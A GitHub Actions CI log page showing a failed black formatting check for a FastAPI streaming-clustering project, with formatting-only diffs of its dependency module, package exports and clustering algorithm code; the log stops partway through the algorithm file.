
Skip to content
Navigation Menu
michaelkatsweb
NCS-API-Project

Code
Issues
Pull requests
Actions
Projects
Security
Insights

    Settings

NCS API CI/CD Pipeline
Update fix-all-pipeline-issues.ps1 #13

Jobs

Run details

Annotations
1 error and 1 warning
Code Quality & Security
failed Jun 10, 2025 in 1m 17s
1s
1s
5s
1m 1s
6s
Run black --check --diff .
--- /home/runner/work/NCS-API-Project/NCS-API-Project/app/__init__.py	2025-06-10 20:31:25.476857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/app/__init__.py	2025-06-10 20:32:31.865538+00:00
@@ -23,11 +23,11 @@
 
 # Package metadata
 __all__ = [
     # Models
     "DataPoint",
-    "ProcessPointsRequest", 
+    "ProcessPointsRequest",
     "ProcessPointResult",
     "ClusterInfo",
     "ClustersSummary",
     "AlgorithmStatus",
     "HealthResponse",
@@ -35,21 +35,19 @@
     "ErrorResponse",
     "ValidationErrorDetail",
     "PaginationParams",
     "BatchProcessingOptions",
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/app/__init__.py
     "ClusteringConfiguration",
-    
     # Exceptions
     "NCSAPIException",
     "AlgorithmException",
     "ValidationException",
     "ProcessingException",
     "ResourceException",
     "ConfigurationException",
     "SecurityException",
     "RateLimitException",
-    
     # Utilities
     "generate_request_id",
     "validate_data_point",
     "validate_batch_size",
     "format_processing_time",
@@ -58,6 +56,6 @@
     "create_error_response",
     "sanitize_input",
     "measure_execution_time",
     "cache_key_generator",
     "validate_clustering_params",
-]
\ No newline at end of file
+]
--- /home/runner/work/NCS-API-Project/NCS-API-Project/app/depenencies.py	2025-06-10 20:31:25.476857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/app/depenencies.py	2025-06-10 20:32:32.302495+00:00
@@ -25,20 +25,29 @@
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/app/depenencies.py
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import redis.asyncio as aioredis
 
 from config import get_settings
 from auth import (
-    get_current_active_user, verify_api_key_dependency,
-    User, APIKeyInfo, rate_limiter
+    get_current_active_user,
+    verify_api_key_dependency,
+    User,
+    APIKeyInfo,
+    rate_limiter,
 )
 from .models import (
-    PaginationParams, BatchProcessingOptions, ClusteringConfiguration,
-    ErrorCode, ProcessingStatus
+    PaginationParams,
+    BatchProcessingOptions,
+    ClusteringConfiguration,
+    ErrorCode,
+    ProcessingStatus,
 )
 from .exceptions import (
-    NCSAPIException, ValidationException, ResourceException,
-    RateLimitException, ProcessingException
+    NCSAPIException,
+    ValidationException,
+    ResourceException,
+    RateLimitException,
+    ProcessingException,
 )
 from .utils import generate_request_id, measure_execution_time
 
 # Get application settings
 settings = get_settings()
@@ -49,137 +58,142 @@
 
 # =============================================================================
 # Core Algorithm Dependencies
 # =============================================================================
 
+
 def get_ncs_algorithm():
     """
     Dependency to get the NeuroCluster Streamer algorithm instance.
-    
+
     Returns:
         NCS algorithm instance
-        
+
     Raises:
         HTTPException: If algorithm is not ready
     """
     from main_secure import api_state
-    
+
     if not api_state.is_ready or api_state.ncs_instance is None:
         raise HTTPException(
             status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
-            detail="NCS algorithm not ready. Please try again later."
+            detail="NCS algorithm not ready. Please try again later.",
         )
-    
+
     return api_state.ncs_instance
 
 
 def get_algorithm_with_health_check():
     """
     Dependency that returns algorithm instance with health validation.
-    
+
     Returns:
         Tuple of (algorithm_instance, health_status)
     """
     algorithm = get_ncs_algorithm()
-    
+
     # Basic health check
     try:
         stats = algorithm.get_statistics()
         health_status = {
             "healthy": True,
-            "clusters": stats.get('num_clusters', 0),
-            "quality": stats.get('clustering_quality', 0.0),
-            "memory_mb": stats.get('memory_usage_estimate_mb', 0.0)
+            "clusters": stats.get("num_clusters", 0),
+            "quality": stats.get("clustering_quality", 0.0),
+            "memory_mb": stats.get("memory_usage_estimate_mb", 0.0),
         }
-        
+
         # Check for warning conditions
-        if stats.get('error_count', 0) > 10:
+        if stats.get("error_count", 0) > 10:
             health_status["healthy"] = False
             health_status["warning"] = "High error count"
-        
-        if stats.get('memory_usage_estimate_mb', 0) > settings.ncs.memory_warning_threshold_mb:
+
+        if (
+            stats.get("memory_usage_estimate_mb", 0)
+            > settings.ncs.memory_warning_threshold_mb
+        ):
             health_status["healthy"] = False
             health_status["warning"] = "High memory usage"
-        
+
         return algorithm, health_status
-        
+
     except Exception as e:
         raise ProcessingException(f"Algorithm health check failed: {str(e)}")
 
 
 # =============================================================================
 # Authentication and Authorization Dependencies
 # =============================================================================
 
+
 async def get_current_user_with_scopes(
     required_scopes: list = None,
-    credentials: HTTPAuthorizationCredentials = Depends(security)
+    credentials: HTTPAuthorizationCredentials = Depends(security),
 ) -> User:
     """
     Dependency for user authentication with scope validation.
-    
+
     Args:
         required_scopes: List of required scopes
         credentials: HTTP ***
-        
+
     Returns:
         Authenticated user
-        
+
     Raises:
         HTTPException: If authentication or authorization fails
     """
     if required_scopes is None:
         required_scopes = ["read"]
-    
+
     # Get current user
     user = await get_current_active_user(credentials)
-    
+
     # Check scopes
     user_scopes = set(user.scopes)
     required_scopes_set = set(required_scopes)
-    
+
     if not required_scopes_set.issubset(user_scopes):
         missing_scopes = required_scopes_set - user_scopes
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
-            detail=f"Insufficient permissions. Missing scopes: {list(missing_scopes)}"
+            detail=f"Insufficient permissions. Missing scopes: {list(missing_scopes)}",
         )
-    
+
     return user
 
 
 async def get_api_key_with_scopes(
     required_scopes: list = None,
-    api_key_info: APIKeyInfo = Depends(verify_api_key_dependency)
+    api_key_info: APIKeyInfo = Depends(verify_api_key_dependency),
 ) -> APIKeyInfo:
     """
     Dependency for API key authentication with scope validation.
-    
+
     Args:
         required_scopes: List of required scopes
         api_key_info: API key information
-        
+
     Returns:
         API key info
-        
+
     Raises:
         HTTPException: If authorization fails
     """
     if required_scopes is None:
         required_scopes = ["read"]
-    
+
     # Check scopes
     api_key_scopes = set(api_key_info.scopes)
     required_scopes_set = set(required_scopes)
-    
+
     if not required_scopes_set.issubset(api_key_scopes):
         missing_scopes = required_scopes_set - api_key_scopes
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
-            detail=f"Insufficient API key permissions. Missing scopes: {list(missing_scopes)}"
+            detail=f"Insufficient API key permissions. Missing scopes: {list(missing_scopes)}",
         )
-    
+
     return api_key_info
 
 
 def require_read_scope():
     """Dependency that requires 'read' scope."""
@@ -190,32 +204,30 @@
     """Dependency that requires 'read' and 'write' scopes."""
     return Depends(lambda: get_current_user_with_scopes(["read", "write"]))
 
 
 def require_admin_scope():
-    """Dependency that requires 'admin' scope.""" 
+    """Dependency that requires 'admin' scope."""
     return Depends(lambda: get_current_user_with_scopes(["admin"]))
 
 
 # =============================================================================
 # Request Validation Dependencies
 # =============================================================================
 
-def validate_pagination(
-    page: int = 1,
-    size: int = 50
-) -> PaginationParams:
+
+def validate_pagination(page: int = 1, size: int = 50) -> PaginationParams:
     """
     Dependency for pagination parameter validation.
-    
+
     Args:
         page: Page number (1-based)
         size: Items per page
-        
+
     Returns:
         Validated pagination parameters
-        
+
     Raises:
         ValidationException: If parameters are invalid
     """
     try:
         return PaginationParams(page=page, size=size)
@@ -226,300 +238,295 @@
 def validate_batch_options(
     enable_parallel: bool = True,
     timeout: int = 300,
     outlier_detection: bool = True,
     adaptive_threshold: bool = True,
-    detailed_metrics: bool = False
+    detailed_metrics: bool = False,
 ) -> BatchProcessingOptions:
     """
     Dependency for batch processing options validation.
-    
+
     Args:
         enable_parallel: Enable parallel processing
         timeout: Processing timeout in seconds
         outlier_detection: Enable outlier detection
         adaptive_threshold: Use adaptive thresholding
         detailed_metrics: Return detailed metrics
-        
+
     Returns:
         Validated batch processing options
-        
+
     Raises:
         ValidationException: If options are invalid
     """
     try:
         return BatchProcessingOptions(
             enable_parallel_processing=enable_parallel,
             batch_timeout_seconds=timeout,
             outlier_detection_enabled=outlier_detection,
             adaptive_threshold=adaptive_threshold,
-            return_detailed_metrics=detailed_metrics
+            return_detailed_metrics=detailed_metrics,
         )
     except Exception as e:
         raise ValidationException(f"Invalid batch options: {str(e)}")
 
 
 def validate_clustering_config(
     base_threshold: float = 0.71,
     learning_rate: float = 0.06,
     max_clusters: int = 30,
     outlier_threshold: float = 0.2,
-    performance_mode: bool = True
+    performance_mode: bool = True,
 ) -> ClusteringConfiguration:
     """
     Dependency for clustering configuration validation.
-    
+
     Args:
         base_threshold: Base similarity threshold
         learning_rate: Learning rate for updates
         max_clusters: Maximum number of clusters
         outlier_threshold: Outlier detection threshold
         performance_mode: Enable performance optimizations
-        
+
     Returns:
         Validated clustering configuration
-        
+
     Raises:
         ValidationException: If configuration is invalid
     """
     try:
         return ClusteringConfiguration(
             base_threshold=base_threshold,
             learning_rate=learning_rate,
             max_clusters=max_clusters,
             outlier_threshold=outlier_threshold,
-            performance_mode=performance_mode
+            performance_mode=performance_mode,
         )
     except Exception as e:
         raise ValidationException(f"Invalid clustering configuration: {str(e)}")
 
 
 # =============================================================================
 # Rate Limiting Dependencies
 # =============================================================================
 
+
 async def check_rate_limit(request: Request) -> Dict[str, Any]:
     """
     Dependency for rate limiting with detailed information.
-    
+
     Args:
         request: FastAPI request object
-        
+
     Returns:
         Rate limit information
-        
+
     Raises:
         RateLimitException: If rate limit is exceeded
     """
     from auth import get_client_ip
-    
+
     client_ip = get_client_ip(request)
     endpoint = request.url.path
-    
+
     # Get endpoint-specific limits
     limits = _get_endpoint_rate_limits(endpoint)
-    
+
     # Check rate limit
     is_allowed, rate_info = rate_limiter.is_allowed(client_ip, endpoint, limits)
-    
+
     if not is_allowed:
         # Determine retry after time
         retry_after = 60  # Default
         if "reset_time" in rate_info:
             retry_after = max(1, int(rate_info["reset_time"] - time.time()))
-        
+
         raise RateLimitException(
             message=f"Rate limit exceeded for {endpoint}",
             retry_after=retry_after,
             details={
                 "client_ip": client_ip,
                 "endpoint": endpoint,
-                "rate_info": rate_info
-            }
+                "rate_info": rate_info,
+            },
         )
-    
+
     return rate_info
 
 
 def _get_endpoint_rate_limits(endpoint: str) -> Dict[str, int]:
     """Get rate limits for specific endpoint."""
     endpoint_limits = {
         "/api/v1/process_points": {
-            "60": 100,     # 100 requests per minute
-            "300": 400,    # 400 requests per 5 minutes  
-            "3600": 2000   # 2000 requests per hour
+            "60": 100,  # 100 requests per minute
+            "300": 400,  # 400 requests per 5 minutes
+            "3600": 2000,  # 2000 requests per hour
         },
-        "/api/v1/clusters_summary": {
-            "60": 300,
-            "300": 1200,
-            "3600": 5000
-        },
-        "/api/v1/algorithm_status": {
-            "60": 600,
-            "300": 2400,
-            "3600": 10000
-        }
+        "/api/v1/clusters_summary": {"60": 300, "300": 1200, "3600": 5000},
+        "/api/v1/algorithm_status": {"60": 600, "300": 2400, "3600": 10000},
     }
-    
+
     # Default limits
     default_limits = {
         "60": settings.security.rate_limit_per_minute,
         "300": settings.security.rate_limit_per_minute * 3,
-        "3600": settings.security.rate_limit_per_minute * 20
+        "3600": settings.security.rate_limit_per_minute * 20,
     }
-    
+
     return endpoint_limits.get(endpoint, default_limits)
 
 
 # =============================================================================
 # Performance Monitoring Dependencies
 # =============================================================================
 
-async def track_request_performance(request: Request) -> AsyncGenerator[Dict[str, Any], None]:
+
+async def track_request_performance(
+    request: Request,
+) -> AsyncGenerator[Dict[str, Any], None]:
     """
     Dependency for tracking request performance metrics.
-    
+
     Args:
         request: FastAPI request object
-        
+
     Yields:
         Performance tracking context
     """
     start_time = time.perf_counter()
     request_id = generate_request_id()
-    
+
     # Store request metadata
     context = {
         "request_id": request_id,
         "endpoint": request.url.path,
         "method": request.method,
         "start_time": start_time,
-        "client_ip": request.client.host
+        "client_ip": request.client.host,
     }
-    
+
     try:
         yield context
     finally:
         # Calculate final metrics
         end_time = time.perf_counter()
         duration_ms = (end_time - start_time) * 1000
-        
-        context.update({
-            "end_time": end_time,
-            "duration_ms": duration_ms,
-            "success": True
-        })
-        
+
+        context.update(
+            {"end_time": end_time, "duration_ms": duration_ms, "success": True}
+        )
+
         # Log performance metrics (could be sent to monitoring system)
         if duration_ms > 1000:  # Log slow requests
             import logging
+
             logger = logging.getLogger(__name__)
             logger.warning(
                 f"Slow request detected: {context['endpoint']} took {duration_ms:.2f}ms"
             )
 
 
 def measure_processing_time():
     """
     Dependency decorator for measuring processing time.
-    
+
     Returns:
         Function decorator that measures execution time
     """
+
     def decorator(func: Callable) -> Callable:
         @wraps(func)
         async def wrapper(*args, **kwargs):
             with measure_execution_time() as timer:
                 result = await func(*args, **kwargs)
-            
+
             # Add timing information to result if it's a dict
             if isinstance(result, dict):
                 result["execution_time_ms"] = timer.elapsed_ms
-            
+
             return result
-        
+
         return wrapper
+
     return decorator
 
 
 # =============================================================================
 # Resource Management Dependencies
 # =============================================================================
 
+
 async def check_system_resources() -> Dict[str, Any]:
     """
     Dependency for checking system resource availability.
-    
+
     Returns:
         System resource information
-        
+
     Raises:
         ResourceException: If resources are critically low
     """
     import psutil
     import os
-    
+
     try:
         # Get memory usage
         process = psutil.Process(os.getpid())
         memory_info = process.memory_info()
         memory_mb = memory_info.rss / (1024 * 1024)
-        
+
         # Get CPU usage
         cpu_percent = psutil.cpu_percent(interval=0.1)
-        
+
         # Check disk space
-        disk_usage = psutil.disk_usage('/')
-        disk_free_gb = disk_usage.free / (1024 ** 3)
-        
+        disk_usage = psutil.disk_usage("/")
+        disk_free_gb = disk_usage.free / (1024**3)
+
         resource_info = {
             "memory_mb": memory_mb,
             "cpu_percent": cpu_percent,
             "disk_free_gb": disk_free_gb,
-            "healthy": True
+            "healthy": True,
         }
-        
+
         # Check for resource constraints
         warnings = []
-        
+
         if memory_mb > settings.ncs.memory_warning_threshold_mb:
             warnings.append(f"High memory usage: {memory_mb:.1f}MB")
             if memory_mb > settings.ncs.memory_warning_threshold_mb * 2:
                 resource_info["healthy"] = False
-        
+
         if cpu_percent > 90:
             warnings.append(f"High CPU usage: {cpu_percent:.1f}%")
             if cpu_percent > 95:
                 resource_info["healthy"] = False
-        
+
         if disk_free_gb < 1.0:
             warnings.append(f"Low disk space: {disk_free_gb:.1f}GB")
             if disk_free_gb < 0.5:
                 resource_info["healthy"] = False
-        
+
         resource_info["warnings"] = warnings
-        
+
         # Raise exception if resources are critically low
         if not resource_info["healthy"]:
             raise ResourceException(
                 message="System resources critically low",
-                details={
-                    "resource_info": resource_info,
-                    "warnings": warnings
-                }
+                details={"resource_info": resource_info, "warnings": warnings},
             )
-        
+
         return resource_info
-        
+
     except psutil.Error as e:
         raise ResourceException(f"Failed to check system resources: {str(e)}")
 
 
 async def get_connection_pool():
     """
     Dependency for getting database/cache connection pool.
-    
+
     Returns:
         Connection pool or None if not available
     """
     # This would return actual connection pool in production
     # For now, return a mock object
@@ -528,73 +535,74 @@
 
 # =============================================================================
 # Caching Dependencies
 # =============================================================================
 
+
 async def get_cache_client() -> Optional[aioredis.Redis]:
     """
     Dependency for getting Redis cache client.
-    
+
     Returns:
         Redis client or None if not available
     """
     if not settings.redis.redis_host:
         return None
-    
+
     try:
         redis_client = aioredis.from_url(
             settings.redis.redis_url,
             encoding="utf-8",
             decode_responses=True,
             socket_timeout=settings.redis.redis_timeout,
-            socket_connect_timeout=settings.redis.redis_timeout
+            socket_connect_timeout=settings.redis.redis_timeout,
         )
-        
+
         # Test connection
         await redis_client.ping()
         return redis_client
-        
+
     except Exception:
         # Cache is optional, don't fail if unavailable
         return None
 
 
 @asynccontextmanager
 async def cache_context(key_prefix: str = "ncs"):
     """
     Async context manager for cache operations.
-    
+
     Args:
         key_prefix: Prefix for cache keys
-        
+
     Yields:
         Cache operations object
     """
     cache_client = await get_cache_client()
-    
+
     class CacheOps:
         def __init__(self, client, prefix):
             self.client = client
             self.prefix = prefix
-        
+
         async def get(self, key: str) -> Optional[str]:
             if not self.client:
                 return None
             return await self.client.get(f"{self.prefix}:{key}")
-        
+
         async def set(self, key: str, value: str, ttl: int = 3600):
             if not self.client:
                 return
             await self.client.setex(f"{self.prefix}:{key}", ttl, value)
-        
+
         async def delete(self, key: str):
             if not self.client:
                 return
             await self.client.delete(f"{self.prefix}:{key}")
-    
+
     cache_ops = CacheOps(cache_client, key_prefix)
-    
+
     try:
         yield cache_ops
     finally:
         if cache_client:
             await cache_client.close()
@@ -602,153 +610,144 @@
 
 # =============================================================================
 # Request Context Dependencies
 # =============================================================================
 
+
 def get_request_context(request: Request) -> Dict[str, Any]:
     """
     Dependency for extracting request context information.
-    
+
     Args:
         request: FastAPI request object
-        
+
     Returns:
         Request context dictionary
     """
     from auth import get_client_ip
-    
+
     return {
         "request_id": generate_request_id(),
         "client_ip": get_client_ip(request),
         "user_agent": request.headers.get("user-agent", ""),
         "endpoint": request.url.path,
         "method": request.method,
         "query_params": dict(request.query_params),
-        "timestamp": time.time()
+        "timestamp": time.time(),
     }
 
 
 def add_response_headers(response: Response, context: Dict[str, Any] = None):
     """
     Dependency for adding standard response headers.
-    
+
     Args:
         response: FastAPI response object
         context: Request context (optional)
     """
     # Add standard headers
     response.headers["X-API-Version"] = "1.0.0"
     response.headers["X-Content-Type-Options"] = "nosniff"
-    
+
     if context:
         response.headers["X-Request-ID"] = context.get("request_id", "")
-        
+
         # Add processing time if available
         if "duration_ms" in context:
             response.headers["X-Processing-Time"] = f"{context['duration_ms']:.2f}ms"
 
 
 # =============================================================================
 # Health Check Dependencies
 # =============================================================================
 
+
 async def get_health_status() -> Dict[str, Any]:
     """
     Dependency for comprehensive health status check.
-    
+
     Returns:
         Health status information
     """
-    health = {
-        "status": "healthy",
-        "timestamp": time.time(),
-        "checks": {}
-    }
-    
+    health = {"status": "healthy", "timestamp": time.time(), "checks": {}}
+
     # Check algorithm
     try:
         algorithm = get_ncs_algorithm()
         stats = algorithm.get_statistics()
         health["checks"]["algorithm"] = {
             "status": "healthy",
-            "clusters": stats.get('num_clusters', 0),
-            "quality": stats.get('clustering_quality', 0.0)
+            "clusters": stats.get("num_clusters", 0),
+            "quality": stats.get("clustering_quality", 0.0),
         }
     except Exception as e:
-        health["checks"]["algorithm"] = {
-            "status": "unhealthy",
-            "error": str(e)
-        }
+        health["checks"]["algorithm"] = {"status": "unhealthy", "error": str(e)}
         health["status"] = "degraded"
-    
+
     # Check cache
     try:
         cache_client = await get_cache_client()
         if cache_client:
             await cache_client.ping()
             health["checks"]["cache"] = {"status": "healthy"}
             await cache_client.close()
         else:
             health["checks"]["cache"] = {"status": "unavailable"}
     except Exception as e:
-        health["checks"]["cache"] = {
-            "status": "unhealthy",
-            "error": str(e)
-        }
+        health["checks"]["cache"] = {"status": "unhealthy", "error": str(e)}
         health["status"] = "degraded"
-    
+
     # Check resources
     try:
         resource_info = await check_system_resources()
         health["checks"]["resources"] = {
             "status": "healthy" if resource_info["healthy"] else "warning",
             "memory_mb": resource_info["memory_mb"],
-            "cpu_percent": resource_info["cpu_percent"]
+            "cpu_percent": resource_info["cpu_percent"],
         }
-        
+
         if not resource_info["healthy"]:
             health["status"] = "degraded"
-            
+
     except Exception as e:
-        health["checks"]["resources"] = {
-            "status": "unhealthy",
-            "error": str(e)
-        }
+        health["checks"]["resources"] = {"status": "unhealthy", "error": str(e)}
         health["status"] = "unhealthy"
-    
+
     return health
 
 
 # =============================================================================
 # Utility Dependencies
 # =============================================================================
+
 
 def get_settings_dependency():
     """Dependency for accessing application settings."""
     return settings
 
 
 def create_dependency_chain(*dependencies):
     """
     Create a chain of dependencies that execute in sequence.
-    
+
     Args:
         *dependencies: Functions to chain as dependencies
-        
+
     Returns:
         Combined dependency function
     """
+
     async def combined_dependency():
         results = []
         for dep in dependencies:
             if asyncio.iscoroutinefunction(dep):
                 result = await dep()
             else:
                 result = dep()
             results.append(result)
         return results
-    
+
     return Depends(combined_dependency)
 
 
 # =============================================================================
 # Export Dependencies
@@ -756,44 +755,35 @@
 
 __all__ = [
     # Algorithm dependencies
     "get_ncs_algorithm",
     "get_algorithm_with_health_check",
-    
     # Authentication dependencies
     "get_current_user_with_scopes",
     "get_api_key_with_scopes",
     "require_read_scope",
-    "require_write_scope", 
+    "require_write_scope",
     "require_admin_scope",
-    
     # Validation dependencies
     "validate_pagination",
     "validate_batch_options",
     "validate_clustering_config",
-    
     # Rate limiting dependencies
     "check_rate_limit",
-    
     # Performance monitoring dependencies
     "track_request_performance",
     "measure_processing_time",
-    
     # Resource management dependencies
     "check_system_resources",
     "get_connection_pool",
-    
     # Caching dependencies
     "get_cache_client",
     "cache_context",
-    
     # Request context dependencies
     "get_request_context",
     "add_response_headers",
-    
     # Health check dependencies
     "get_health_status",
-    
     # Utility dependencies
     "get_settings_dependency",
     "create_dependency_chain",
-]
\ No newline at end of file
+]
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/NCS_V8.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/NCS_V8.py	2025-06-10 20:31:25.475857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/NCS_V8.py	2025-06-10 20:32:32.498587+00:00
@@ -32,10 +32,11 @@
 
 
 @dataclass
 class ClusterInfo:
     """Information about a cluster."""
+
     centroid: np.ndarray
     confidence: float
     age: float
     updates: int
     last_update: int
@@ -43,33 +44,35 @@
 
 
 class NeuroClusterStreamer:
     """
     High-performance streaming clustering algorithm with adaptive intelligence.
-    
+
     The algorithm uses vectorized operations, dynamic thresholds, and multi-layer
     outlier detection to achieve superior performance and clustering quality.
     """
-    
-    def __init__(self,
-                 base_threshold: float = 0.71,
-                 learning_rate: float = 0.06,
-                 decay_rate: float = 0.002,
-                 min_confidence: float = 0.2,
-                 merge_threshold: float = 0.9,
-                 outlier_threshold: float = 0.2,
-                 stability_window: int = 100,
-                 validation_window: int = 15,
-                 performance_mode: bool = True,
-                 max_clusters: int = 30,
-                 max_batch_size: int = 10000,
-                 max_point_dimensions: int = 1000,
-                 latency_warning_threshold_ms: float = 0.2,
-                 memory_warning_threshold_mb: float = 100.0):
+
+    def __init__(
+        self,
+        base_threshold: float = 0.71,
+        learning_rate: float = 0.06,
+        decay_rate: float = 0.002,
+        min_confidence: float = 0.2,
+        merge_threshold: float = 0.9,
+        outlier_threshold: float = 0.2,
+        stability_window: int = 100,
+        validation_window: int = 15,
+        performance_mode: bool = True,
+        max_clusters: int = 30,
+        max_batch_size: int = 10000,
+        max_point_dimensions: int = 1000,
+        latency_warning_threshold_ms: float = 0.2,
+        memory_warning_threshold_mb: float = 100.0,
+    ):
         """
         Initialize NeuroCluster Streamer with optimized parameters.
-        
+
         Args:
             base_threshold: Base similarity threshold for cluster assignment
             learning_rate: Learning rate for centroid updates
             decay_rate: Confidence decay rate over time
             min_confidence: Minimum confidence for cluster retention
@@ -89,120 +92,127 @@
         self.learning_rate = learning_rate
         self.decay_rate = decay_rate
         self.min_confidence = min_confidence
         self.merge_threshold = merge_threshold
         self.outlier_threshold = outlier_threshold
-        
+
         # Performance parameters
         self.stability_window = stability_window
         self.validation_window = validation_window
         self.performance_mode = performance_mode
         self.max_clusters = max_clusters
         self.max_batch_size = max_batch_size
         self.max_point_dimensions = max_point_dimensions
-        
+
         # Warning thresholds
         self.latency_warning_threshold_ms = latency_warning_threshold_ms
         self.memory_warning_threshold_mb = memory_warning_threshold_mb
-        
+
         # Algorithm state
         self.clusters: List[Dict[str, Any]] = []
         self.time_step = 0
         self.total_points_processed = 0
-        
+
         # Bounded tracking collections for memory efficiency
         self.similarity_history = deque(maxlen=stability_window)
         self.distance_history = deque(maxlen=stability_window)
         self.quality_history = deque(maxlen=50)
         self.outlier_buffer = deque(maxlen=25)
-        
+
         # Performance tracking
         self.processing_times = deque(maxlen=50)
         self.error_count = 0
         self.warning_count = 0
-        
+
         # Adaptive state
         self.current_dynamic_threshold = base_threshold
         self.global_stability = 1.0
         self.clustering_quality = 1.0
         self.adaptation_rate = 1.0
-        
+
         # Caching for performance (when performance_mode is True)
         self._threshold_cache = {}
         self._cluster_array_cache = None
         self._cache_dirty = True
         self._last_cache_time = 0
-        
+
         # Thread safety
         self._lock = threading.RLock()
-        
+
         # Suppress NumPy warnings for performance
         if self.performance_mode:
-            warnings.filterwarnings('ignore', category=RuntimeWarning)
-        
+            warnings.filterwarnings("ignore", category=RuntimeWarning)
+
         # Initialize internal state
         self._initialize_state()
-    
+
     def _initialize_state(self):
         """Initialize internal algorithm state."""
         # Pre-allocate arrays for performance
         if self.performance_mode:
             self._temp_similarities = np.zeros(self.max_clusters, dtype=np.float32)
             self._temp_distances = np.zeros(self.max_clusters, dtype=np.float32)
-        
+
         # Initialize statistics
         self._stats = {
-            'total_points_processed': 0,
-            'clusters_created': 0,
-            'clusters_merged': 0,
-            'outliers_detected': 0,
-            'avg_processing_time_ms': 0.0,
-            'max_processing_time_ms': 0.0,
-            'memory_usage_estimate_mb': 0.0
+            "total_points_processed": 0,
+            "clusters_created": 0,
+            "clusters_merged": 0,
+            "outliers_detected": 0,
+            "avg_processing_time_ms": 0.0,
+            "max_processing_time_ms": 0.0,
+            "memory_usage_estimate_mb": 0.0,
         }
-    
-    def process_data_point(self, point: Union[List[float], np.ndarray]) -> Tuple[int, bool, float]:
+
+    def process_data_point(
+        self, point: Union[List[float], np.ndarray]
+    ) -> Tuple[int, bool, float]:
         """
         Process a single data point through the NCS algorithm.
-        
+
         Args:
             point: Input data point as list or numpy array
-            
+
         Returns:
             Tuple of (cluster_id, is_outlier, outlier_score)
             - cluster_id: Assigned cluster ID (-1 for outliers)
             - is_outlier: Boolean indicating if point is an outlier
             - outlier_score: Outlier confidence score [0-1]
         """
         start_time = time.perf_counter()
-        
+
         try:
             with self._lock:
                 # Convert and validate input
                 x_array = self._validate_and_convert_point(point)
-                
+
                 # Increment time step
                 self.time_step += 1
                 self.total_points_processed += 1
-                
+
                 # Multi-layer outlier detection
                 outlier_score = self._enhanced_outlier_detection(x_array)
                 if outlier_score > self.outlier_threshold:
                     self.outlier_buffer.append(x_array.copy())
-                    self._stats['outliers_detected'] += 1
+                    self._stats["outliers_detected"] += 1
                     processing_time = (time.perf_counter() - start_time) * 1000
                     self._record_processing_time(processing_time)
                     return -1, True, outlier_score
-                
+
                 # Find best cluster using vectorized operations
-                best_cluster_idx, best_similarity = self._vectorized_find_best_cluster(x_array)
-                
+                best_cluster_idx, best_similarity = self._vectorized_find_best_cluster(
+                    x_array
+                )
+
                 # Get dynamic threshold
                 dynamic_threshold = self._get_dynamic_threshold()
-                
+
                 # Cluster assignment decision
-                if best_cluster_idx is not None and best_similarity >= dynamic_threshold:
+                if (
+                    best_cluster_idx is not None
+                    and best_similarity >= dynamic_threshold
+                ):
                     # Update existing cluster
                     self._adaptive_cluster_update(best_cluster_idx, x_array)
                     cluster_id = best_cluster_idx
                     is_outlier = False
                 else:
@@ -212,726 +222,772 @@
                         is_outlier = False
                         outlier_score = 0.0
                     else:
                         # Add to outlier buffer
                         self.outlier_buffer.append(x_array.copy())
-                        self._stats['outliers_detected'] += 1
+                        self._stats["outliers_detected"] += 1
                         cluster_id = -1
                         is_outlier = True
-                
+
                 # Periodic maintenance
                 if self.time_step % 50 == 0:
                     self._enhanced_maintenance()
-                
+
                 # Record performance metrics
                 processing_time = (time.perf_counter() - start_time) * 1000
                 self._record_processing_time(processing_time)
-                
+
                 return cluster_id, is_outlier, outlier_score
-                
+
         except Exception as e:
             self.error_count += 1
             processing_time = (time.perf_counter() - start_time) * 1000
             self._record_processing_time(processing_time)
             # Return outlier classification for error cases
             return -1, True, 1.0
-    
-    def _validate_and_convert_point(self, point: Union[List[float], np.ndarray]) -> np.ndarray:
+
+    def _validate_and_convert_point(
+        self, point: Union[List[float], np.ndarray]
+    ) -> np.ndarray:
         """Validate and convert input point to numpy array."""
         if isinstance(point, list):
             if len(point) == 0:
                 raise ValueError("Empty point provided")
             if len(point) > self.max_point_dimensions:
-                raise ValueError(f"Point has {len(point)} dimensions, max allowed: {self.max_point_dimensions}")
+                raise ValueError(
+                    f"Point has {len(point)} dimensions, max allowed: {self.max_point_dimensions}"
+                )
             x_array = np.array(point, dtype=np.float32)
         elif isinstance(point, np.ndarray):
             if point.size == 0:
                 raise ValueError("Empty point provided")
             if point.size > self.max_point_dimensions:
-                raise ValueError(f"Point has {point.size} dimensions, max allowed: {self.max_point_dimensions}")
+                raise ValueError(
+                    f"Point has {point.size} dimensions, max allowed: {self.max_point_dimensions}"
+                )
             x_array = point.astype(np.float32)
         else:
             raise ValueError(f"Point must be list or numpy array, got {type(point)}")
-        
+
         # Check for invalid values
         if not np.isfinite(x_array).all():
             raise ValueError("Point contains invalid values (NaN or infinity)")
-        
+
         return x_array
-    
+
     def _enhanced_outlier_detection(self, point: np.ndarray) -> float:
         """
         Multi-layer outlier detection combining geometric, statistical, and temporal analysis.
-        
+
         Args:
             point: Input data point
-            
+
         Returns:
             Outlier score [0-1], higher values indicate higher outlier probability
         """
         if len(self.clusters) == 0:
             return 0.0  # No clusters yet, not an outlier
-        
+
         # Layer 1: Geometric distance analysis
         geometric_score = self._geometric_outlier_detection(point)
-        
+
         # Layer 2: Statistical anomaly detection
         statistical_score = self._statistical_outlier_detection(point)
-        
+
         # Layer 3: Temporal coherence validation
         temporal_score = self._temporal_outlier_detection(point)
-        
+
         # Combine scores with weighted average
-        outlier_score = (0.4 * geometric_score + 
-                        0.3 * statistical_score + 
-                        0.3 * temporal_score)
-        
+        outlier_score = (
+            0.4 * geometric_score + 0.3 * statistical_score + 0.3 * temporal_score
+        )
+
         return np.clip(outlier_score, 0.0, 1.0)
-    
+
     def _geometric_outlier_detection(self, point: np.ndarray) -> float:
         """Layer 1: Geometric distance-based outlier detection."""
         if len(self.clusters) == 0:
             return 0.0
-        
+
